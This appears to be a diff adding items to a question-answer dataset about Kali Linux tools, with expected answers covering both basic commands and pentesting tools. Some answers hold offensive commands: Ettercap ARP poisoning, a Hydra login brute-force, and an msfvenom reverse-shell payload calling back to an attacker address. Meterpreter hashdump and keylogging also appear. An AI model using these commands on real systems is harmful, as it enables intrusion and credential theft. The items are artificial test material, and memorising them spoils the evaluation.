+    "expected_answer": "WhatWeb is a web technology fingerprinting tool in Kali Linux that identifies content management systems, web frameworks, server software, JavaScript libraries, analytics platforms, and other technologies used by a website. Running `whatweb http://target.com` provides a quick summary, while `whatweb -a 3 http://target.com` uses aggressive detection with more HTTP requests for deeper identification. The output reveals details like the web server (Apache/Nginx), programming language (PHP/Python), CMS (WordPress/Joomla), and specific version numbers when detectable. WhatWeb recognizes over 1,800 plugins covering different web technologies and can scan multiple URLs from a file with `whatweb -i urls.txt`. In penetration testing, technology fingerprinting is an essential reconnaissance step that guides exploit selection—knowing a target runs WordPress 5.2 with a specific plugin version allows precise vulnerability matching from databases like WPScan or CVE records.",
+    "reasoning_requirement": "Match fingerprinting tool.",
+    "evaluation_criteria": "Correct tool name.",
+    "category": "kali_tools"
+  },
+  {
+    "id": 40,
+    "prompt": "What command checks manual documentation for a tool?",
+    "expected_answer": "The `man <toolname>` command displays the manual page for any installed tool on Linux, providing comprehensive documentation including syntax, options, examples, and related commands. For example, `man nmap` opens Nmap's extensive manual with all available flags and usage examples, navigable with arrow keys, `/` for searching, and `q` to quit. If a man page is not available, most tools support `--help` or `-h` flags for a brief usage summary. Man pages are organized into sections: 1 for user commands, 5 for file formats, 8 for system administration commands, accessed with `man 5 passwd` for the passwd file format. In penetration testing, referencing man pages is essential for understanding obscure tool flags, verifying correct syntax before running potentially disruptive scans, and discovering advanced features that are not covered in quick-start tutorials.",
+    "reasoning_requirement": "Recall help documentation method.",
+    "evaluation_criteria": "Correct syntax.",
+    "category": "kali_tools"
+  },
+  {
+    "id": 41,
+    "prompt": "Which framework assists in post-exploitation tasks in labs?",
+    "expected_answer": "Metasploit's Meterpreter is the primary post-exploitation framework used in Kali Linux labs, providing an advanced interactive shell that runs in memory on compromised systems. Once a Meterpreter session is established, commands like `sysinfo` display system details, `getuid` shows the current privilege level, `hashdump` extracts password hashes from the SAM database, and `getsystem` attempts automatic privilege escalation. The `upload`/`download` commands transfer files, `screenshot` captures the desktop, and `keyscan_start` enables keylogging. Meterpreter's `pivot` and `route` commands enable lateral movement through the compromised host to reach otherwise inaccessible network segments. In penetration testing, Meterpreter's in-memory execution and encrypted communication channel make it a powerful tool for demonstrating the full impact of a vulnerability while maintaining operational stealth during authorized engagements.",
+    "reasoning_requirement": "Identify post-exploitation component.",
+    "evaluation_criteria": "Names Meterpreter.",
+    "category": "kali_tools"
+  },
+  {
+    "id": 42,
+    "prompt": "What command compresses files into a tar archive?",
+    "expected_answer": "The command `tar -cvf archive.tar /path/to/files` creates a tar archive, where `-c` creates a new archive, `-v` enables verbose output showing each file added, and `-f` specifies the output filename. To add gzip compression, use `tar -czvf archive.tar.gz /path/to/files` which adds the `-z` flag; for bzip2 compression use `-j` instead, yielding smaller files at the cost of speed. Extraction is performed with `tar -xvf archive.tar` or `tar -xzvf archive.tar.gz` for compressed archives. The `-t` flag lists contents without extracting: `tar -tzvf archive.tar.gz`. In penetration testing, tar is frequently used for exfiltrating directories of findings and scan results, packaging evidence for reports, creating backups before modifying system files during authorized testing, and compressing large packet capture files for transfer.",
+    "reasoning_requirement": "Recall tar creation flags.",
+    "evaluation_criteria": "Correct tar command usage.",
+    "category": "kali_tools"
+  },
+  {
+    "id": 43,
+    "prompt": "Which tool performs ARP spoofing in authorized lab tests?",
+    "expected_answer": "Ettercap is the primary ARP spoofing and man-in-the-middle (MITM) attack tool in Kali Linux, available in both graphical and command-line interfaces. The command `sudo ettercap -T -M arp:remote /target1_ip// /gateway_ip//` performs ARP poisoning between a target host and the gateway, redirecting network traffic through the attacker's machine. Ettercap includes built-in protocol dissectors that can extract credentials from HTTP, FTP, Telnet, and other cleartext protocols in real time. Additional features include DNS spoofing via custom etter.dns entries, content filtering to inject or modify traffic, and plugin support for SSLstrip attacks. In penetration testing, ARP spoofing demonstrates the risks of unencrypted protocols on local networks and tests the effectiveness of network segmentation, ARP inspection controls (DAI), and 802.1X port security implementations.",
+    "reasoning_requirement": "Identify MITM testing tool.",
+    "evaluation_criteria": "Names Ettercap.",
+    "category": "kali_tools"
+  },
+  {
+    "id": 44,
+    "prompt": "What command changes ownership of a file?",
+    "expected_answer": "The `chown` command changes the owner and/or group of files and directories on Linux systems, requiring root privileges to execute. The syntax is `chown user:group filename`—for example, `sudo chown kali:kali report.txt` sets both owner and group to 'kali', while `chown kali file.txt` changes only the owner. The `-R` flag applies ownership changes recursively through directories: `sudo chown -R www-data:www-data /var/www/html/`. You can change only the group with `chown :groupname file` or use the dedicated `chgrp` command. In penetration testing, chown is relevant in privilege escalation scenarios—if a low-privileged user can somehow change ownership of sensitive files like `/etc/shadow` or SUID binaries, it represents a critical misconfiguration. Reviewing file ownership with `ls -la` is a standard step in post-exploitation enumeration.",
+    "reasoning_requirement": "Recall ownership command.",
+    "evaluation_criteria": "Correct command.",
+    "category": "kali_tools"
+  },
+  {
+    "id": 45,
+    "prompt": "Which Kali tool helps analyze SSL/TLS configurations?",
+    "expected_answer": "sslscan is a dedicated SSL/TLS analysis tool in Kali Linux that probes a server's HTTPS configuration to identify supported protocols, cipher suites, and certificate details. Running `sslscan target.com` produces color-coded output highlighting insecure configurations—weak ciphers in red, deprecated protocols (SSLv3, TLS 1.0) clearly flagged, and certificate chain issues identified. It tests for vulnerabilities like Heartbleed, POODLE, and ROBOT, and checks for proper HSTS header implementation. The alternative tool `testssl.sh` provides even more comprehensive testing with `testssl.sh target.com`, checking for over 30 different TLS vulnerabilities and rating the overall configuration. In penetration testing, SSL/TLS analysis identifies downgrade attack opportunities, expired or self-signed certificates, missing certificate pinning, and weak encryption that could enable traffic interception or session hijacking.",
+    "reasoning_requirement": "Match tool to TLS analysis.",
+    "evaluation_criteria": "Correct tool name.",
+    "category": "kali_tools"
+  },
+  {
+    "id": 46,
+    "prompt": "What command shows network routing table?",
+    "expected_answer": "The command `ip route` (or `ip route show`) displays the kernel routing table on Linux systems, showing how network traffic is directed to different destinations. The output lists each route with the destination network, gateway address, interface, and protocol. For example, `default via 192.168.1.1 dev eth0` indicates the default gateway, while `192.168.1.0/24 dev eth0 proto kernel` shows a directly connected network. The older `route -n` and `netstat -rn` commands provide similar information but are deprecated. Adding a route is done with `sudo ip route add 10.0.0.0/8 via 192.168.1.1`. In penetration testing, understanding the routing table is critical for identifying accessible network segments, setting up pivoting routes through compromised hosts with tools like `sshuttle` or Metasploit's autoroute, and detecting misconfigured routes that might allow unauthorized access to internal networks.",
+    "reasoning_requirement": "Recall routing inspection command.",
+    "evaluation_criteria": "Correct command.",
+    "category": "kali_tools"
+  },
+  {
+    "id": 47,
+    "prompt": "Which tool is used to brute force web login forms in labs?",
+    "expected_answer": "Hydra and Burp Suite Intruder are the two primary tools in Kali Linux for brute forcing web login forms in authorized lab environments. With Hydra, the command `hydra -l admin -P wordlist.txt target_ip http-post-form '/login:username=^USER^&password=^PASS^:Invalid credentials'` tests credentials against an HTTP POST login form, where the last parameter is the failure string. Burp Suite Intruder provides a graphical alternative—capture the login request in Proxy, send it to Intruder, mark the password field as a payload position, load a wordlist, and start the attack while monitoring response lengths for successful logins. Key considerations include setting appropriate thread counts to avoid overwhelming the server and watching for CSRF tokens that must be extracted fresh for each request. In penetration testing, credential brute forcing demonstrates the importance of account lockout policies, rate limiting, CAPTCHA implementation, and strong password requirements.",
+    "reasoning_requirement": "Match tool to login testing.",
+    "evaluation_criteria": "Valid lab-appropriate tool identified.",
+    "category": "kali_tools"
+  },
+  {
+    "id": 48,
+    "prompt": "What does chmod 644 represent?",
+    "expected_answer": "The permission `chmod 644` sets a file so the owner has read and write access (6=4+2), while the group and all other users have read-only access (4). This means the owner can view and modify the file, but everyone else can only read it—nobody gets execute permission. In octal notation, each digit represents the sum of read (4), write (2), and execute (1) for owner, group, and others respectively. This is the standard permission for most regular files like configuration files, HTML pages, and text documents. The equivalent symbolic notation is `chmod u=rw,go=r filename`. In penetration testing, finding sensitive files like private SSH keys or database credentials with 644 permissions (world-readable) instead of 600 (owner-only) represents a security misconfiguration that should be reported, as any user on the system can read these files to escalate privileges or access restricted resources.",
+    "reasoning_requirement": "Interpret numeric permissions.",
+    "evaluation_criteria": "Correct breakdown.",
+    "category": "kali_tools"
+  },
+  {
+    "id": 49,
+    "prompt": "Which tool in Kali assists with payload generation for testing?",
+    "expected_answer": "msfvenom is the unified payload generation tool in Kali Linux's Metasploit Framework, combining the older msfpayload and msfencode utilities. A typical command is `msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe -o shell.exe` which generates a Windows executable that connects back to the attacker with a Meterpreter session. Key flags include `-p` for payload selection, `-f` for output format (exe, elf, raw, python, php, asp, war, etc.), `-e` for encoding to evade basic signature detection, and `-i` for encoding iterations. You can list all available payloads with `msfvenom -l payloads` and formats with `msfvenom -l formats`. In penetration testing, msfvenom generates custom payloads for testing endpoint detection capabilities, demonstrating the risk of executing untrusted files, and validating that security controls properly identify and block malicious binaries.",
+    "reasoning_requirement": "Identify payload generation tool.",
+    "evaluation_criteria": "Correctly names msfvenom.",
+    "category": "kali_tools"
+  },
+  {
+    "id": 50,
+    "prompt": "What is the primary purpose of Kali Linux?",
+    "expected_answer": "Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing, security auditing, and digital forensics in authorized environments. It comes pre-installed with over 600 security tools organized into categories including information gathering (Nmap, Recon-ng), vulnerability analysis (OpenVAS, Nikto), web application testing (Burp Suite, sqlmap), password attacks (John the Ripper, Hashcat), wireless testing (Aircrack-ng), exploitation (Metasploit), and post-exploitation. Maintained by Offensive Security, it receives regular updates to tools and the underlying OS, and is available as ISO, VM images, ARM builds for Raspberry Pi, and cloud instances. Kali is used by professional penetration testers, security researchers, and students preparing for certifications like OSCP (Offensive Security Certified Professional). It should only be used in authorized testing environments with explicit written permission, as unauthorized use of its tools constitutes illegal activity in most jurisdictions.",
+    "reasoning_requirement": "Describe high-level purpose responsibly.",
+    "evaluation_criteria": "Emphasizes legal and authorized usage.",
+    "category": "kali_tools"
+  }
+]
